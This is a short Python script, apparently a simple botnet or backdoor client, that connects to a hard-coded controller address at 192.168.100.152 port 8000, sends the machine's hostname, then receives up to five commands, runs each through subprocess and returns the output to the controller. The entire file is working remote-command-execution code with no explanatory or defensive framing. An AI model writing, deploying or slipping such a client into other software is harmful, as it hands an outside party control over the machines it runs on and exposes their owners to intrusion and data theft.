import socket
import subprocess


def botclient():
    HOST = '192.168.100.152'
    PORT = 8000

    s = socket.socket()
    s.connect((HOST, PORT))

    message = 'Connection from '+socket.gethostname()
    s.send(message.encode())
    data = ''
    count=0
    while data != 'end' and count<5:
        data = s.recv(1024).decode()
        count=count+1
        print('at exec')
        print(data)
        data=data.replace('\n','')
        data=data.split(' ')
        print(data)
        try:
        	message=subprocess.run(data,stdout=subprocess.PIPE)
        	s.send(message.stdout)
        except Exception as e:
        	print(e)
        	print('Error processing'.format(data))
    s.close()


if __name__ == '__main__':
    botclient()
